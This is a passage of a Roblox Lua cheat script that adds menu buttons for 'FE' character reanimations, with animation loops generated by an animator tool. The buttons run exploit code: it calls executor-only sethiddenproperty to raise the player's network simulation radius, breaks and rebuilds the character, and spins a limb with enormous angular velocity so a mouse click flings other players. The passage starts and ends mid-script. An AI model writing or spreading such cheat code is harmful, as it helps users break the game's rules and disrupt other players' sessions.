LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+30*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-30*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
end
srv.RenderStepped:Wait()
end
end)()

Mode = 'Normal'
mode=m.KeyDown:Connect(function(a)
if a == 'c' then
Mode = 'normal man'
end
if a == 'v' then
Mode = 'Crazy man'
end
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then mode:Disconnect() break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == 'normal man' then
--First Mode--
if reanim.Humanoid.Jump then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+45*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-45*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
-------------
elseif Mode == 'Crazy man' then
--Second Mode--
if reanim.Humanoid.Jump then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(13.23+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(601.64+0*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(234.84+0*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-17.34+50*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-17.34+-50*math.cos(sine/10)),math.rad(0+1280*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
--------------
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4 MADE BY REDMOON (SHOWCASE=CREDITS)
end)

Section:NewButton("Fe Villager(Need: Pal Hair)", "Bacon Hair", function()
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {} local te = table.insert local m = plr:GetMouse()  if char:FindFirstChild('Pal Hair') then else return end  _G.Jitter=Vector3.new(0,30,0)  for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'HumanoidRootPart' then  bf=Instance.new('BodyForce',v) bf.Force=Vector3.new(50,50,50) te(ct,game:GetService("RunService").Heartbeat:connect(function() pcall(function() v.Velocity = _G.Jitter v.BodyForce.Force=Vector3.new(50,50,50) game.Players.LocalPlayer.ReplicationFocus=workspace sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",9e9) end) end)) end end  char.Archivable = true fl=Instance.new('Folder',char) fl.Name = 'ArmFling' local reanim = char:Clone() char.Humanoid:ChangeState(16) char.HumanoidRootPart:Destroy()  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  hats=0 function create(part, parent, p, r) hats=hats+1 Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name..hats parent.Attachment.Name = part.Name..hats part.AlignPosition.Attachment0 = part[part.Name..hats] part.AlignOrientation.Attachment0 = part[part.Name..hats] part.AlignPosition.Attachment1 = parent[part.Name..hats] part.AlignOrientation.Attachment1 = parent[part.Name..hats] parent[part.Name..hats].Position = p or Vector3.new() part[part.Name..hats].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  function Pos(part, parent, p) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part.AlignPosition.MaxForce = 999999999*10 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false end  function nc(p) if p:IsA('BasePart') or p:IsA('Part') then te(ct,srv.Stepped:Connect(function() p.CanCollide=false end)) te(ct,srv.RenderStepped:Connect(function() p.CanCollide=false end)) else print('Cannot noclip '..p) end end  function af() for i,v in next, game.Players:GetDescendants() do if v:IsA('Player') and v.Name ~= game.Players.LocalPlayer.Name then for _,c in next, v.Character:GetDescendants() do if c:IsA('BasePart') and v.Parent== char then noo=Instance.new('NoCollisionConstraint',c) noo.Part1=char['Torso'] noo.Part0=c noo2=Instance.new('NoCollisionConstraint',c) noo2.Part1=char['Head'] noo2.Part0=c end end end end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') and v.Name ~= 'Pal Hair' then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Motor6D') and v.Name ~= 'Neck' then v:Destroy() end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') and v.Name ~= 'Right Leg' and v.Name ~= 'Head' and v.Parent == char then create(v,reanim[v.Name]) end end  function flinger(p) f=Instance.new('BodyAngularVelocity',p) f.P=9e9*10 f.AngularVelocity = Vector3.new(9e9*10,9e9*10,9e9*10) f.MaxTorque=Vector3.new(9e9*10,0,0) return f end  Pos(char['Right Leg'],reanim['Torso']) fliiiin=flinger(char['Right Leg'])  char['Pal Hair'].Handle:BreakJoints() char['Pal Hair'].Handle.Mesh:Destroy()  create(char['Pal Hair'].Handle,reanim['Right Leg'],Vector3.new(),Vector3.new(90,0,0))  reanim.Animate.Disabled=true  reanim.Parent=fl  sh=false  fp=Instance.new('Part',reanim) fp.Name='FlingPart' fp.CanCollide=false fp.Transparency=1 if clickfling then te(ct,m.Button1Down:Connect(function() sh=true end))  te(ct,m.Button1Up:Connect(function() sh=false end)) end te(ct,srv.Heartbeat:Connect(function() m.TargetFilter=char if sh then fp.CFrame=CFrame.new(m.Hit.p) char['Right Leg'].Position=fp.Position else fp.CFrame=char.Torso.CFrame*CFrame.new(0,0,0) char['Right Leg'].Position=fp.Position end end))  plr.Character=reanim workspace.Camera.CameraSubject=reanim  HumanDied=false  te(ct,reanim.Humanoid.Died:Connect(function() HumanDied=true fliiiin:Destroy() reanim.HumanoidRootPart.Anchored=true old=reanim.HumanoidRootPart.CFrame reanim.HumanoidRootPart.CFrame=old wait() reanim.HumanoidRootPart.CFrame=old char.Humanoid:Destroy() Instance.new('Humanoid',char) plr.Character=char char:BreakJoints() game.Players:Chat('-gr') for i,v in next, ct do v:Disconnect() end end))

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.93+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-86.12+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10)),math.rad(89.64+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(89.64+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-86.12+0*math.cos(sine/10))),.2)
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.93+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-86.12+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10)),math.rad(89.64+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(0.93+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-86.12+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(-2.06+0*math.cos(sine/10)),math.rad(89.64+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+120*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-120*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4 MADE BY REDMOON (IF YOU WANT SHOWCASE IT GIVE CREDITS)
end)

Section:NewButton("Fe CrazyMonster(Need: Pal Hair)", "Bacon Hair again", function()
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {} local te = table.insert local m = plr:GetMouse()  if char:FindFirstChild('Pal Hair') then else return end  _G.Jitter=Vector3.new(0,30,0)  for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'HumanoidRootPart' then  bf=Instance.new('BodyForce',v) bf.Force=Vector3.new(50,50,50) te(ct,game:GetService("RunService").Heartbeat:connect(function() pcall(function() v.Velocity = _G.Jitter v.BodyForce.Force=Vector3.new(50,50,50) game.Players.LocalPlayer.ReplicationFocus=workspace sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",9e9) end) end)) end end  char.Archivable = true fl=Instance.new('Folder',char) fl.Name = 'ArmFling' local reanim = char:Clone() char.Humanoid:ChangeState(16) char.HumanoidRootPart:Destroy()  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  hats=0 function create(part, parent, p, r) hats=hats+1 Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name..hats parent.Attachment.Name = part.Name..hats part.AlignPosition.Attachment0 = part[part.Name..hats] part.AlignOrientation.Attachment0 = part[part.Name..hats] part.AlignPosition.Attachment1 = parent[part.Name..hats] part.AlignOrientation.Attachment1 = parent[part.Name..hats] parent[part.Name..hats].Position = p or Vector3.new() part[part.Name..hats].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  function Pos(part, parent, p) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] 